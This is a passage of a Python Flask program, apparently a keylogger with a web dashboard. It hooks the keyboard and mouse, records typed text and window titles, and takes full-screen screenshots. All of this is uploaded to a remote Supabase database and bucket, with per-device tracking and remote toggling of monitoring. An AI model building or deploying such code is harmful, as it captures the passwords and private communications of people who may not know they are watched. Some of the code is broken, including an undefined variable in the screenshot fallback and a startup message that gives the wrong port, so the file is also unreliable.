            btn.disabled = checkedCount === 0;
            btn.innerText = `Delete Selected (${checkedCount})`;
            
            const selectAllBox = document.getElementById('select-all-logs');
            if (checkboxes.length > 0) {
                const allChecked = Array.from(checkboxes).every(box => {
                    const key = `${box.getAttribute('data-timestamp')}||${box.getAttribute('data-text')}`;
                    return selectedLogKeys.has(key);
                });
                selectAllBox.checked = allChecked;
            } else {
                selectAllBox.checked = false;
            }
        }
        
        async function deleteLog(timestamp, text) {
            if (!confirm("Are you sure you want to delete this log entry? (This will also delete the associated screenshot if present)")) {
                return;
            }
            try {
                const res = await fetch('/api/logs', {
                    method: 'DELETE',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ timestamp, text, date: selectedDate })
                });
                if (res.ok) {
                    const key = `${timestamp}||${text}`;
                    selectedLogKeys.delete(key);
                    fetchLogs();
                } else {
                    alert("Failed to delete log entry");
                }
            } catch (err) {
                console.error("Error deleting log:", err);
            }
        }
        
        async function bulkDeleteLogs() {
            if (selectedLogKeys.size === 0) return;
            
            if (!confirm(`Are you sure you want to delete the ${selectedLogKeys.size} selected log entries? (This will also delete their associated screenshots)`)) {
                return;
            }
            
            const targets = Array.from(selectedLogKeys).map(key => {
                const parts = key.split('||');
                return { timestamp: parts[0], text: parts[1] };
            });
            
            try {
                const res = await fetch('/api/logs/bulk-delete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ logs: targets, date: selectedDate })
                });
                if (res.ok) {
                    selectedLogKeys.clear();
                    fetchLogs();
                } else {
                    alert("Failed to delete selected logs");
                }
            } catch (err) {
                console.error("Error bulk deleting logs:", err);
            }
        }
        
        // Selection handlers for Screenshots
        function toggleSelectAllScreenshots(selectAllBox) {
            const checkboxes = document.querySelectorAll('.screenshot-item-checkbox');
            checkboxes.forEach(box => {
                box.checked = selectAllBox.checked;
                const filename = box.getAttribute('data-filename');
                if (selectAllBox.checked) {
                    selectedScreenshotFilenames.add(filename);
                } else {
                    selectedScreenshotFilenames.delete(filename);
                }
            });
            updateScreenshotSelection();
        }
        
        function updateScreenshotSelection() {
            const checkboxes = document.querySelectorAll('.screenshot-item-checkbox');
            checkboxes.forEach(box => {
                const filename = box.getAttribute('data-filename');
                if (box.checked) {
                    selectedScreenshotFilenames.add(filename);
                } else {
                    selectedScreenshotFilenames.delete(filename);
                }
            });
            
            const checkedCount = selectedScreenshotFilenames.size;
            const btn = document.getElementById('bulk-delete-screenshots-btn');
            btn.disabled = checkedCount === 0;
            btn.innerText = `Delete Selected (${checkedCount})`;
            
            const selectAllBox = document.getElementById('select-all-screenshots');
            if (checkboxes.length > 0) {
                const allChecked = Array.from(checkboxes).every(box => {
                    return selectedScreenshotFilenames.has(box.getAttribute('data-filename'));
                });
                selectAllBox.checked = allChecked;
            } else {
                selectAllBox.checked = false;
            }
        }
        
        async function deleteScreenshot(filename) {
            if (!confirm("Are you sure you want to delete this screenshot?")) {
                return;
            }
            try {
                const res = await fetch(`/api/screenshots/${filename}`, {
                    method: 'DELETE'
                });
                if (res.ok) {
                    selectedScreenshotFilenames.delete(filename);
                    fetchScreenshots();
                } else {
                    alert("Failed to delete screenshot");
                }
            } catch (err) {
                console.error("Error deleting screenshot:", err);
            }
        }
        
        async function bulkDeleteScreenshots() {
            if (selectedScreenshotFilenames.size === 0) return;
            
            if (!confirm(`Are you sure you want to delete the ${selectedScreenshotFilenames.size} selected screenshots?`)) {
                return;
            }
            
            const filenames = Array.from(selectedScreenshotFilenames);
            
            try {
                const res = await fetch('/api/screenshots/bulk-delete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ filenames })
                });
                if (res.ok) {
                    selectedScreenshotFilenames.clear();
                    fetchScreenshots();
                } else {
                    alert("Failed to delete selected screenshots");
                }
            } catch (err) {
                console.error("Error bulk deleting screenshots:", err);
            }
        }
        
        function escapeHtml(str) {
            return str
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }
        
        // Initial load
        async function init() {
            // Restore active tab
            if (currentTab === 'screenshots-tab') {
                const btn = document.querySelector('button[onclick*="screenshots-tab"]');
                if (btn) switchTab('screenshots-tab', btn);
            }
            // Restore sort select if it exists in UI
            const sortSelect = document.getElementById('sort-select');
            if (sortSelect) sortSelect.value = selectedSort;
            
            // Set date inputs
            document.getElementById('start-date-input').value = startDate;
            document.getElementById('end-date-input').value = endDate;
            
            await fetchDevices();
            fetchLogs();
            fetchScreenshots();
        }
        init();
        
        // Update loops
        setInterval(() => {
            if (currentTab === 'logs-tab') {
                fetchLogs();
            } else {
                fetchScreenshots();
            }
        }, 2000);
        
        setInterval(() => {
            fetchDevices();
            if (currentTab === 'logs-tab') {
                fetchScreenshots();
            } else {
                fetchLogs();
            }
        }, 10000);
    </script>
</body>
</html>
"""

def parse_logs(date_str):
    log_file = os.path.join("logs", f"log_{date_str}.txt")
    if not os.path.exists(log_file):
        return []
    logs = []
    
    current_entry = {}
    with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line_str = line.strip()
            if line_str.startswith("--- ") and line_str.endswith(" ---"):
                if current_entry:
                    logs.append(current_entry)
                timestamp = line_str[4:-4]
                current_entry = {
                    "timestamp": timestamp,
                    "window": "Unknown Window",
                    "text": "",
                    "screenshot": None
                }
            elif line_str.startswith("Active Window:"):
                if current_entry:
                    current_entry["window"] = line_str[len("Active Window:"):].strip()
            elif line_str.startswith("Typed Text   :"):
                if current_entry:
                    current_entry["text"] = line_str[len("Typed Text   :"):].strip()
            elif line_str.startswith("Screenshot   :"):
                if current_entry:
                    screenshot_path = line_str[len("Screenshot   :"):].strip()
                    if screenshot_path and screenshot_path != "None":
                        if os.path.exists(screenshot_path):
                            current_entry["screenshot"] = screenshot_path.replace("\\", "/")
            elif line_str.startswith("----------------------------------------"):
                if current_entry:
                    logs.append(current_entry)
                    current_entry = {}
                    
        if current_entry and current_entry.get("timestamp"):
            logs.append(current_entry)
            
    return [log for log in logs if log.get("timestamp")]

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/screenshots/<path:filename>')
def serve_screenshot(filename):
    return send_from_directory('screenshots', filename)

@app.route('/api/devices')
def get_devices():
    if supabase is not None:
        try:
            res = supabase.table("devices").select("*").order("nickname").execute()
            return jsonify(res.data)
        except Exception as e:
            print(f"Failed to query devices from Supabase: {e}")
            
    # Fallback/local mode
    device_id = get_device_id()
    hostname = socket.gethostname() or "Unknown Device"
    return jsonify([{"device_id": device_id, "nickname": hostname}])

@app.route('/api/devices/rename', methods=['POST'])
def rename_device():
    data = request.json
    device_id = data.get("device_id")
    nickname = data.get("nickname")
    if not device_id or not nickname:
        return jsonify({"error": "Device ID and Nickname required"}), 400
        
    if supabase is not None:
        try:
            supabase.table("devices").update({"nickname": nickname}).eq("device_id", device_id).execute()
            return jsonify({"status": "success"}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
            
    return jsonify({"error": "Supabase not connected"}), 400

@app.route('/api/devices/toggle-monitoring', methods=['POST'])
def toggle_device_monitoring():
    data = request.json
    device_id = data.get("device_id")
    is_disabled = data.get("is_disabled")
    if not device_id or is_disabled is None:
        return jsonify({"error": "Device ID and is_disabled flag required"}), 400
        
    if supabase is not None:
        try:
            supabase.table("devices").update({"is_disabled": is_disabled}).eq("device_id", device_id).execute()
            return jsonify({"status": "success"}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
            
    return jsonify({"error": "Supabase not connected"}), 400

@app.route('/api/dates')
def get_available_dates():
    dates = set()
    device_id = request.args.get("device_id")
    
    # Try querying Supabase
    if supabase is not None:
        try:
            query = supabase.table("activity_logs").select("created_date")
            if device_id:
                query = query.eq("device_id", device_id)
            res = query.execute()
            if res.data:
                for row in res.data:
                    dates.add(row["created_date"])
        except Exception as e:
            print(f"Failed to query dates from Supabase: {e}")
            
    # Always include local dates as backup
    if os.path.exists("logs"):
        for f in os.listdir("logs"):
            match = re.match(r"^log_(\d{4}-\d{2}-\d{2})\.txt$", f)
            if match:
                dates.add(match.group(1))
    if os.path.exists("screenshots"):
        for d in os.listdir("screenshots"):
            if re.match(r"^\d{4}-\d{2}-\d{2}$", d) and os.path.isdir(os.path.join("screenshots", d)):
                dates.add(d)
                
    if not dates:
        dates.add(datetime.now().strftime("%Y-%m-%d"))
        
    return jsonify(sorted(list(dates), reverse=True))

@app.route('/api/logs')
def get_logs():
    start_date = request.args.get("start_date")
    end_date = request.args.get("end_date")
    
    if not start_date or not end_date:
        single_date = request.args.get("date", datetime.now().strftime("%Y-%m-%d"))
        start_date = single_date
        end_date = single_date
        
    device_id = request.args.get("device_id")
    
    # Try querying Supabase
    if supabase is not None:
        try:
            query = supabase.table("activity_logs") \
                .select("timestamp, window_title, typed_text, screenshot_url, screenshot_filename") \
                .gte("created_date", start_date) \
                .lte("created_date", end_date)
            
            if device_id:
                query = query.eq("device_id", device_id)
                
            res = query.order("timestamp", desc=False).execute()
                
            logs = []
            for row in res.data:
                screenshot_filename = row["screenshot_filename"]
                screenshot_url = row["screenshot_url"]
                
                # Dynamically generate a temporary signed URL if the bucket is private
                if screenshot_filename and supabase is not None:
                    try:
                        signed_res = supabase.storage.from_(SUPABASE_BUCKET).create_signed_url(screenshot_filename, 3600)
                        screenshot_url = signed_res.get("signedURL") or signed_res.get("signedUrl") or screenshot_url
                    except Exception as e:
                        print(f"Error signing URL: {e}")
                        
                logs.append({
                    "timestamp": row["timestamp"],
                    "window": row["window_title"],
                    "text": row["typed_text"],
                    "screenshot": screenshot_url,
                    "screenshot_filename": screenshot_filename
                })
            return jsonify(logs)
        except Exception as e:
            print(f"Failed to query logs from Supabase: {e}")
            
    # Fallback to local files
    return jsonify(parse_logs(start_date))

@app.route('/api/screenshots')
def get_screenshots():
    start_date = request.args.get("start_date")
    end_date = request.args.get("end_date")
    
    if not start_date or not end_date:
        single_date = request.args.get("date", datetime.now().strftime("%Y-%m-%d"))
        start_date = single_date
        end_date = single_date
        
    device_id = request.args.get("device_id")
    
    # Try querying Supabase
    if supabase is not None:
        try:
            query = supabase.table("activity_logs") \
                .select("timestamp, window_title, screenshot_url, screenshot_filename") \
                .gte("created_date", start_date) \
                .lte("created_date", end_date) \
                .not_.is_("screenshot_url", "null")
            
            if device_id:
                query = query.eq("device_id", device_id)
                
            res = query.order("timestamp", desc=False).execute()
                
            screenshot_list = []
            for row in res.data:
                screenshot_filename = row["screenshot_filename"]
                screenshot_url = row["screenshot_url"]
                
                # Dynamically generate a temporary signed URL if the bucket is private
                if screenshot_filename and supabase is not None:
                    try:
                        signed_res = supabase.storage.from_(SUPABASE_BUCKET).create_signed_url(screenshot_filename, 3600)
                        screenshot_url = signed_res.get("signedURL") or signed_res.get("signedUrl") or screenshot_url
                    except Exception as e:
                        print(f"Error signing URL: {e}")
                        
                screenshot_list.append({
                    "filename": screenshot_filename,
                    "url": screenshot_url,
                    "time": row["timestamp"],
                    "window": row["window_title"]
                })
            return jsonify(screenshot_list)
        except Exception as e:
            print(f"Failed to query screenshots from Supabase: {e}")
            
    # Fallback to local files
    screenshot_dir = os.path.join("screenshots", start_date)
    if not os.path.exists(screenshot_dir):
        return jsonify([])
    files = os.listdir(screenshot_dir)
    png_files = sorted([f for f in files if f.endswith(".png") or f.endswith(".webp")], reverse=False)
    
    logs = parse_logs(start_date)
    screenshot_to_window = {}
    for log_entry in logs:
        if log_entry["screenshot"]:
            filename = os.path.basename(log_entry["screenshot"])
            screenshot_to_window[filename] = log_entry["window"]
            
    screenshot_list = []
    for f in png_files:
        ts_part = f.replace("screenshot_", "").replace("screenshot_periodic_", "").split(".")[0]
        try:
            parts = ts_part.split("_")
            date_part = parts[0]
            time_part = parts[1]
            formatted_time = f"{date_part[0:4]}-{date_part[4:6]}-{date_part[6:8]} {time_part[0:2]}:{time_part[2:4]}:{time_part[4:6]}"
        except Exception:
            formatted_time = ts_part
            
        screenshot_list.append({
            "filename": f"{date_str}/{f}",
            "url": f"/screenshots/{date_str}/{f}",
            "time": formatted_time,
            "window": screenshot_to_window.get(f, "Unknown Window")
        })
    return jsonify(screenshot_list)

@app.route('/api/screenshots/<path:filename>', methods=['DELETE'])
def delete_screenshot(filename):
    if '..' in filename:
        return jsonify({"error": "Invalid filename"}), 400
        
    supabase_deleted = False
    if supabase is not None and SUPABASE_BUCKET:
        try:
            # Delete from Supabase Storage
            supabase.storage.from_(SUPABASE_BUCKET).remove([filename])
            
            # Nullify log entry in Supabase DB
            supabase.table("activity_logs") \
                .update({"screenshot_url": None, "screenshot_filename": None}) \
                .eq("screenshot_filename", filename) \
                .execute()
                
            supabase_deleted = True
        except Exception as e:
            print(f"Failed to delete screenshot from Supabase: {e}")
            
    # Try deleting locally
    local_path = os.path.join("screenshots", filename)
    local_deleted = False
    if os.path.exists(local_path):
        try:
            os.remove(local_path)
            local_deleted = True
        except Exception:
            pass
            
    if supabase_deleted or local_deleted:
        return jsonify({"status": "success"}), 200
        
    return jsonify({"error": "File not found or deletion failed"}), 404

@app.route('/api/screenshots/bulk-delete', methods=['POST'])
def bulk_delete_screenshots():
    try:
        data = request.json
        filenames = data.get("filenames", [])
        
        # 1. Delete from Supabase
        if supabase is not None and SUPABASE_BUCKET and filenames:
            try:
                # Remove from storage
                supabase.storage.from_(SUPABASE_BUCKET).remove(filenames)
                
                # Nullify in database
                for filename in filenames:
                    supabase.table("activity_logs") \
                        .update({"screenshot_url": None, "screenshot_filename": None}) \
                        .eq("screenshot_filename", filename) \
                        .execute()
            except Exception as e:
                print(f"Failed to bulk delete screenshots from Supabase: {e}")
                
        # 2. Delete local files
        success_count = 0
        for filename in filenames:
            if '..' in filename:
                continue
            path = os.path.join("screenshots", filename)
            if os.path.exists(path):
                try:
                    os.remove(path)
                    success_count += 1
                except Exception:
                    pass
        return jsonify({"status": "success", "deleted": len(filenames)}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/logs', methods=['DELETE'])
def delete_log():
    try:
        data = request.json
        timestamp = data.get("timestamp")
        text = data.get("text")
        date_str = data.get("date")
        if not timestamp or not date_str:
            return jsonify({"error": "Timestamp and Date required"}), 400
            
        # Try deleting from Supabase
        if supabase is not None:
            try:
                # Get the screenshot file to delete from Storage first
                res = supabase.table("activity_logs") \
                    .select("screenshot_filename") \
                    .eq("timestamp", timestamp) \
                    .eq("typed_text", text) \
                    .execute()
                    
                if res.data:
                    for row in res.data:
                        screenshot_file = row.get("screenshot_filename")
                        if screenshot_file and SUPABASE_BUCKET:
                            try:
                                supabase.storage.from_(SUPABASE_BUCKET).remove([screenshot_file])
                            except Exception:
                                pass
                                
                # Delete from DB
                supabase.table("activity_logs") \
                    .delete() \
                    .eq("timestamp", timestamp) \
                    .eq("typed_text", text) \
                    .execute()
            except Exception as e:
                print(f"Failed to delete log from Supabase: {e}")
                
        # Fallback to local logs deletion
        log_files = [
            os.path.join("logs", f"log_{date_str}.txt"),
            "log.txt"
        ]
        
        for log_file in log_files:
            if not os.path.exists(log_file):
                continue
            with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            
            escaped_ts = re.escape(timestamp)
            escaped_text = re.escape(text)
            
            pattern = re.compile(
                rf"--- {escaped_ts} ---\r?\nActive Window:.*?\r?\nTyped Text   : {escaped_text}\r?\nScreenshot   : (.*?)\r?\n(?:Screenshot File: (.*?)\r?\n)?-+\r?\n\r?\n?",
                re.DOTALL
            )
            
            match = pattern.search(content)
            if match:
                screenshot_path = match.group(1).strip()
                if screenshot_path and screenshot_path != "None" and not screenshot_path.startswith("http") and log_file == log_files[0]:
                    if os.path.exists(screenshot_path):
                        try:
                            os.remove(screenshot_path)
                        except Exception:
                            pass
                
                content = pattern.sub("", content)
                with open(log_file, "w", encoding="utf-8") as f:
                    f.write(content)
                    
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/logs/bulk-delete', methods=['POST'])
def bulk_delete_logs():
    try:
        data = request.json
        targets = data.get("logs", [])
        date_str = data.get("date")
        if not targets or not date_str:
            return jsonify({"error": "Logs and Date required"}), 400
            
        # Delete from Supabase
        if supabase is not None:
            try:
                for target in targets:
                    ts = target.get("timestamp")
                    txt = target.get("text")
                    
                    # Get the screenshot filename
                    res = supabase.table("activity_logs") \
                        .select("screenshot_filename") \
                        .eq("timestamp", ts) \
                        .eq("typed_text", txt) \
                        .execute()
                        
                    if res.data:
                        for row in res.data:
                            screenshot_file = row.get("screenshot_filename")
                            if screenshot_file and SUPABASE_BUCKET:
                                try:
                                    supabase.storage.from_(SUPABASE_BUCKET).remove([screenshot_file])
                                except Exception:
                                    pass
                                    
                    # Delete the row
                    supabase.table("activity_logs") \
                        .delete() \
                        .eq("timestamp", ts) \
                        .eq("typed_text", txt) \
                        .execute()
            except Exception as e:
                print(f"Failed to bulk delete logs from Supabase: {e}")
                
        # Delete from local files
        log_files = [
            os.path.join("logs", f"log_{date_str}.txt"),
            "log.txt"
        ]
        
        for log_file in log_files:
            if not os.path.exists(log_file):
                continue
            with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
                
            for target in targets:
                ts = target.get("timestamp")
                txt = target.get("text")
                
                escaped_ts = re.escape(ts)
                escaped_text = re.escape(txt)
                
                pattern = re.compile(
                    rf"--- {escaped_ts} ---\r?\nActive Window:.*?\r?\nTyped Text   : {escaped_text}\r?\nScreenshot   : (.*?)\r?\n(?:Screenshot File: (.*?)\r?\n)?-+\r?\n\r?\n?",
                    re.DOTALL
                )
                
                match = pattern.search(content)
                if match:
                    screenshot_path = match.group(1).strip()
                    if screenshot_path and screenshot_path != "None" and not screenshot_path.startswith("http") and log_file == log_files[0]:
                        if os.path.exists(screenshot_path):
                            try:
                                os.remove(screenshot_path)
                            except Exception:
                                pass
                    content = pattern.sub("", content)
                    
            with open(log_file, "w", encoding="utf-8") as f:
                f.write(content)
                
        return jsonify({"status": "success", "deleted": len(targets)}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

current_line = []

def get_active_window_title():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        if length > 0:
            buff = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value
        return "Unknown Window"
    except Exception:
        return "Unknown Window"

def migrate_literal_newlines():
    log_files = []
    if os.path.exists("logs"):
        for f in os.listdir("logs"):
            if f.endswith(".txt"):
                log_files.append(os.path.join("logs", f))
    if os.path.exists("log.txt"):
        log_files.append("log.txt")
        
    for log_file in log_files:
        try:
            with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            if "\\n" in content:
                content = content.replace("\\n", "\n")
                with open(log_file, "w", encoding="utf-8") as f:
                    f.write(content)
        except Exception:
            pass

def capture_and_upload_screenshot(prefix):
    """
    Captures a screenshot, saves it locally as a temporary WebP, uploads it to Supabase Storage
    if configured, and returns (screenshot_url, screenshot_filename).
    """
    if is_monitoring_disabled:
        return None, None
    now = datetime.now()
    date_str = now.strftime("%Y-%m-%d")
    timestamp_file = now.strftime("%Y%m%d_%H%M%S_%f")
    
    # 1. Local paths
    local_dir = os.path.join("screenshots", date_str)
    os.makedirs(local_dir, exist_ok=True)
    filename = f"{prefix}_{timestamp_file}.webp"
    local_path = os.path.join(local_dir, filename)
    
    # 2. Grab and compress as WebP
    try:
        if mss is not None:
            with mss.mss() as sct:
                # Capture all screens combined
                monitor = sct.monitors[0]
                sct_img = sct.grab(monitor)
                # Convert raw BGRA bytes from direct GDI to PIL RGB Image
                screenshot = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
        else:
            # Fallback to PIL ImageGrab if mss is not available
            screenshot = ImageGrab.grab(all_screens=True)
            
        # Omit redundant screenshots if screen has not changed
        if is_screenshot_redundant(screenshot):
            return None, None
            
        # Scale down to standard 1280px width if larger to save disk space
        max_width = 1280
        if screenshot.width > max_width:
            ratio = max_width / float(screenshot.width)
            new_height = int(float(screenshot.height) * ratio)
            screenshot = screenshot.resize((max_width, new_height), Image.Resampling.LANCZOS)
            
        screenshot.save(local_path, "WEBP", quality=45)
    except Exception as e:
        print(f"Failed to capture or save screenshot: {e}")
        return None, None
        
    s3_path = f"{date_str}/{filename}"
    screenshot_url = None
    
    # 3. Upload to Supabase Storage
    if supabase is not None and SUPABASE_BUCKET:
        try:
            with open(local_path, "rb") as f:
                supabase.storage.from_(SUPABASE_BUCKET).upload(
                    path=s3_path,
                    file=f,
                    file_options={"content-type": "image/webp", "x-upsert": "true"}
                )
            
            # Get Public URL
            res_url = supabase.storage.from_(SUPABASE_BUCKET).get_public_url(s3_path)
            screenshot_url = res_url
            
            # Delete local temp file to save disk space
            try:
                os.remove(local_path)
            except Exception:
                pass
                
        except Exception as e:
            print(f"Failed to upload screenshot to Supabase Storage: {e}")
            screenshot_url = f"screenshots/{date_str}/{filename}"
    else:
        screenshot_url = f"screenshots/{date_str}/{filename}"
        
    return screenshot_url, s3_path

def write_log(timestamp, window_title, line_str, screenshot_url=None, screenshot_filename=None):
    if is_monitoring_disabled:
        return
    device_id = get_device_id()
    supabase_success = False
    
    # 1. Database logging (if Supabase is initialized)
    if supabase is not None:
        try:
            now_date = datetime.now().strftime("%Y-%m-%d")
            data = {
                "device_id": device_id,
                "timestamp": timestamp,
                "created_date": now_date,
                "window_title": window_title,
                "typed_text": line_str,
                "screenshot_url": screenshot_url,
                "screenshot_filename": screenshot_filename
            }
            supabase.table("activity_logs").insert(data).execute()
            supabase_success = True
        except Exception as e:
            print(f"Failed to insert log to Supabase DB: {e}")

    # 2. Local Fallback/Backup logging
    if not supabase_success:
        try:
            date_str = datetime.now().strftime("%Y-%m-%d")
            log_file = os.path.join("logs", f"log_{date_str}.txt")
            root_log = "log.txt"
            
            block = [
                f"--- {timestamp} ---",
                f"Device ID    : {device_id}",
                f"Active Window: {window_title}",
                f"Typed Text   : {line_str}",
                f"Screenshot   : {screenshot_url if screenshot_url else 'None'}",
                f"Screenshot File: {screenshot_filename if screenshot_filename else 'None'}",
                "----------------------------------------",
                ""
            ]
            block_text = "\n".join(block) + "\n"
            
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(block_text)
            with open(root_log, "a", encoding="utf-8") as f:
                f.write(block_text)
        except Exception as e:
            print(f"Failed to write local fallback log: {e}")

def on_press(key):
    global current_line, last_activity_time
    last_activity_time = datetime.now()
    try:
        if hasattr(key, 'char') and key.char is not None:
            if ord(key.char) >= 32:
                current_line.append(key.char)
        elif key == pynput.keyboard.Key.space:
            current_line.append(' ')
        elif key == pynput.keyboard.Key.backspace:
            if current_line:
                current_line.pop()
        elif key == pynput.keyboard.Key.enter:
            line_str = "".join(current_line).strip()
            current_line = []
            if not line_str:
                return
                
            now = datetime.now()
            
            # Reset screenshot timer on manual enter
            global last_screenshot_time
            last_screenshot_time = now
            
            timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
            window_title = get_active_window_title()
            
            # Capture and upload screenshot (WebP)
            screenshot_url, screenshot_filename = capture_and_upload_screenshot("screenshot")
            
            write_log(timestamp, window_title, line_str, screenshot_url, screenshot_filename)
    except Exception:
        pass

def on_mouse_activity(*args):
    global last_activity_time
    now = datetime.now()
    if (now - last_activity_time).total_seconds() > 1:
        last_activity_time = now

def periodic_checker():
    global last_activity_time, last_screenshot_time, current_line
    while True:
        time.sleep(5)
        now = datetime.now()
        inactive_seconds = (now - last_activity_time).total_seconds()
        time_since_last_screenshot = (now - last_screenshot_time).total_seconds()
        
        # Take a periodic screenshot if active
        if inactive_seconds < 300 and time_since_last_screenshot >= 300:
            timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
            window_title = get_active_window_title()
            
            # Capture and upload screenshot (WebP)
            screenshot_url, screenshot_filename = capture_and_upload_screenshot("screenshot_periodic")
            
            buffered_text = "".join(current_line).strip()
            if buffered_text:
                log_msg = f"[Periodic Capture - Active] {buffered_text}"
            else:
                log_msg = f"[Periodic Capture - Active] (Activity detected)"
                
            write_log(timestamp, window_title, log_msg, screenshot_url, screenshot_filename)
            
            last_screenshot_time = now

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def run_server():
    port = int(os.environ.get('PORT', 58291))
    app.run(host='127.0.0.1', port=port, debug=False, use_reloader=False)

if __name__ == '__main__':
    # Check if we should only run the server (no local keyboard/mouse listeners)
    server_only = os.environ.get('SERVER_ONLY', 'false').lower() == 'true' or pynput is None
    
    if server_only:
        print("Running in SERVER ONLY mode (Dashboard Web UI). Keylog hooks disabled.")
        run_server()
    else:
        # Run log migration to fix any literal newlines
        migrate_literal_newlines()
        
        # Start Flask server in a daemon thread
        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        
        # Start periodic activity checker thread
        checker_thread = threading.Thread(target=periodic_checker, daemon=True)
        checker_thread.start()
        
        # Start mouse activity listener thread
        mouse_listener = pynput.mouse.Listener(
            on_move=on_mouse_activity,
            on_click=on_mouse_activity,
            on_scroll=on_mouse_activity
        )
        mouse_listener.start()
        
        local_ip = get_local_ip()
        print(f"\n==================================================")
        print(f"Keystroke Monitor Dashboard is active.")
        print(f"Access locally: http://localhost:5000")
        print(f"Access on WiFi: http://{local_ip}:5000")
        print(f"==================================================\n")
        
        # Start keyboard listener in main thread
        with pynput.keyboard.Listener(on_press=on_press) as listener:
            listener.join()